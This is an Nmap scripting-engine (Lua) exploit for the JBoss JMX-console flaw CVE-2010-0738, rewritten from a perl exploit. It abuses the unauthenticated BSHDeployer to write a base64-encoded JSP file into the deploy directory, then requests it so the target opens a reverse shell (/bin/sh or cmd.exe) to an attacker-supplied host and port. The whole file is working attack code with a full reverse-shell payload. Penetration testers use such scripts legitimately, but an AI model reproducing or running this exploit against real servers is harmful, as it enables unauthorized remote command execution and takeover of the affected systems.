description = [[
JBoss Enterprise Application Platform is prone to multiple vulnerabilities,
including an information-disclosure issue and multiple  authentication-bypass
issues. An attacker can exploit these issues to bypass certain security
restrictions to obtain sensitive information or gain unauthorized access
to the application.
this script will attempt to exploit one of these vulnerabilities and get a
reverse shell on the target machine.

This exploit is a rewrite to NSE of the Kingcope's perl exploit (daytona_bsh.pl).

More information: 
http://www.exploit-db.com/exploits/16274/
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0738
http://www.securityfocus.com/bid/39710

]]

-- @usage nmap -p8080 -sV --script jboss-vuln-cve2010-0738 --script-args="reverse_host=192.168.1.204,reverse_port=5555,cmd=cmd.exe" <target>
--
-- @output
-- PORT   STATE SERVICE VERSION
-- 80/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1 (Tomcat 5.5)
-- | jboss-vuln-cve2010-0738: 
-- |   VULNERABLE:
-- |   JBoss Application Server Remote Exploit
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:CVE-2010-0738
-- |     Description:
-- |       JBoss Enterprise Application Platform is prone to multiple
-- |       vulnerabilities, including an information-disclosure issue
-- |       and multiple  authentication-bypass issues. An attacker can
-- |       exploit these issues to bypass certain security restrictions
-- |       to obtain sensitive information or gain unauthorized access
-- |       to the application.
-- |       
-- |     Disclosure date: 2010-04-26
-- |     Extra information:
-- |       EXPLOIT SUCCESSFULL EXECUTED, VERIFY YOUR REVERSE SHELL
-- |     References:
-- |       http://www.exploit-db.com/exploits/16274/
-- |       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0738
-- |_      http://www.securityfocus.com/bid/39710

--
-- @args jboss-cve2010-0738.reverse_host Host waiting a reverse shell
-- @args jboss-cve2010-0738.reverse_port Port listening to reverse shell
-- @args jboss-cve2010-0738.cmd shell/cmd to be executed in the target machine.
-- @args jboss-cve2010-0738.max_tries Maximum of tries for execute the uploaded jsp. Default: 5
---


local nmap = require "nmap"
local stdnse = require "stdnse"
local table = require "table"
local vulns = require "vulns"
local base64 = require "base64"
local url = require "url"
local http = require "http"

author = "Tiago Natel de Moura (i4k) <natel()secplus.com.br>"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"discovery", "intrusive", "vuln"}

portrule = function(host, port)
   if (port.state  == "open") then
      local version = port.version
      if (string.find(version.product, nocase("Tomcat")) ~= nil or
          string.find(version.product, "JBoss")) then
         return true
      else
         return false
      end
   else
      return false
   end
end

function nocase (s)
   local s = string.gsub(s, "%a",
                   function (c)
                      return string.format("[%s%s]",
                                           string.lower(c),
                                           string.upper(c))
                   end)
   return s
end

function pdebug(fmt, ...)
   local _fmt = ("%s: "):format(SCRIPT_NAME)
   _fmt = _fmt .. fmt                 
   stdnse.print_debug(1, _fmt, ...)
end


action = function( host, port )
   local vuln = {
      title = 'JBoss Application Server Remote Exploit',
      IDS = {CVE = 'CVE-2010-0738'},
      state = vulns.STATE.NOT_VULN,
      description = [[
JBoss Enterprise Application Platform is prone to multiple
vulnerabilities, including an information-disclosure issue
and multiple  authentication-bypass issues. An attacker can
exploit these issues to bypass certain security restrictions
to obtain sensitive information or gain unauthorized access
to the application.
]],
references = {
   'http://www.exploit-db.com/exploits/16274/',
   'http://www.securityfocus.com/bid/39710'
},
dates = {
   disclosure = {year = '2010', month = '04', day = '26'},
},
   }
   local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
   local reverse_host = stdnse.get_script_args(SCRIPT_NAME .. '.reverse_host')
   local reverse_port = stdnse.get_script_args(SCRIPT_NAME .. '.reverse_port')
   local shell = stdnse.get_script_args(SCRIPT_NAME .. '.cmd') or nil
   local max_tries = stdnse.get_script_args(SCRIPT_NAME .. '.max_tries') or 5
   local appbase = nil
   local jspname = nil
   local bsh_script = nil
   local params = nil


   if (not reverse_host or not reverse_port) then
      return ("ERROR:%s: REQUIRED script_args reverse_host or reverse_port not set."):format(SCRIPT_NAME)
   end
   
   pdebug("JBOSS Remote Exploit in execution")

   if (shell == nil and
       host.os ~= nil and
       host.os[1] ~= nil and
       host.os[1].name ~= nil) then
      if (string.find(host.os[1].name, nocase("Linux")) ~= nil or
          string.find(host.os[1].name, nocase("BSD")) ~= nil) then
         shell = "/bin/sh"
      elseif (string.find(host.os[1].name, nocase("Windows")) ~= nil) then
         shell = "cmd.exe"
      else
         return ("ERROR:%s: script_args .cmd not set, target OS is '%s'"):format(SCRIPT_NAME, host.os[1].name)
      end
   elseif (shell == nil) then
      return ("ERROR:%s: script_args .cmd not set, target OS is unknown"):format(SCRIPT_NAME)
   end

   local jsp_reverse = [[
<%@
page import="java.lang.*, java.util.*, java.io.*, java.net.*"
%>
            <%!
                static class StreamConnector extends Thread
                {
                    InputStream is;
                    OutputStream os;

                    StreamConnector( InputStream is, OutputStream os )
                    {
                        this.is = is;
                        this.os = os;
                    }

                    public void run()
                    {
                        BufferedReader in  = null;
                        BufferedWriter out = null;
                        try
                        {
                            in  = new BufferedReader( new InputStreamReader( this.is ) );
                            out = new BufferedWriter( new OutputStreamWriter( this.os ) );
                            char buffer[] = new char[8192];
                            int length;
                            while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 )
                            {
                                out.write( buffer, 0, length );
                                out.flush();
                            }
                        } catch( Exception e ){}
                        try
                        {
                            if( in != null )
                                in.close();
                            if( out != null )
                                out.close();
                        } catch( Exception e ){}
                    }
                }
            %>
            <%
                try
                {
                    Socket socket = new Socket( "]] .. reverse_host .. [[", ]] .. reverse_port .. [[ );
                    Process process = Runtime.getRuntime().exec( "]] .. shell .. [[" );
                    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
                    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
                } catch( Exception e ) {}
            %> ]]

            appbase = stdnse.generate_random_string(8)
            jspname = stdnse.generate_random_string(8)
            
            pdebug("SHELL=%s", shell)
            pdebug("APPBASE=%s", appbase)
            pdebug("JSPNAME=%s", jspname)

            bsh_script = [[import java.io.FileOutputStream;
import sun.misc.BASE64Decoder;

String val = "]]
   .. base64.enc(jsp_reverse) ..
   [[";

BASE64Decoder decoder = new BASE64Decoder();
String jboss_home = System.getProperty("jboss.server.home.dir");
new File(jboss_home + "/deploy/]]
   .. appbase ..
   [[.war").mkdir();
byte[] byteval = decoder.decodeBuffer(val);
String jsp_file = jboss_home + "/deploy/]]
   .. appbase ..
   [[.war/]]
   .. jspname ..
   [[.jsp";
   FileOutputStream fstream = new FileOutputStream(jsp_file);
   fstream.write(byteval);
   fstream.close();]]

   params = "action=invokeOpByName&name=jboss.deployer:service=BSHDeployer&methodName=createScriptDeployment&argType=java.lang.String&arg0=" .. url.escape(bsh_script) .. "&argType=java.lang.String&arg1=" .. stdnse.generate_random_string(8) .. ".bsh";

   local response = http.head( host.ip, port.number, "/jmx-console/HtmlAdaptor?" .. params )

   if (response ~= nil and
       response['status'] ~= nil) then
      local status = response['status']
      if ((status >= 200 and status < 300) or
          (status >= 500 and status < 600)) then
         if (response['body'] ~= nil) then
            pdebug("%s", response['body'])
         end

         stdnse.sleep(5)
         local url = "/" .. appbase .. "/" .. jspname .. ".jsp"

         for i=1,max_tries do
            local res = http.get(host.ip, port.number, url)

            if (res ~= nil and res['status'] ~= nil and
                res['status'] == 200) then

               vuln.extra_info = ("EXPLOIT SUCCESSFULL, REVERSE SHELL AT %s:%s"):format(reverse_host, reverse_port)
               vuln.state = vulns.STATE.EXPLOIT
               
               return vuln_report:make_output(vuln)
            else
               pdebug("FAILED TO EXECUTE UPLOADED REVERSE SHELL")
               if (res ~= nil and res['status'] ~= nil and res['status-line']) then
                  pdebug("%d: %s", res['status'], res['status-line'])
               end
               if (i < 9) then pdebug("TRYING EXECUTING AGAIN... (%d)", i) end
            end
            stdnse.sleep(5)
         end
      else
         pdebug("EXPLOIT FAILED")
      end
   end

   return vuln_report:make_output(vuln)
end
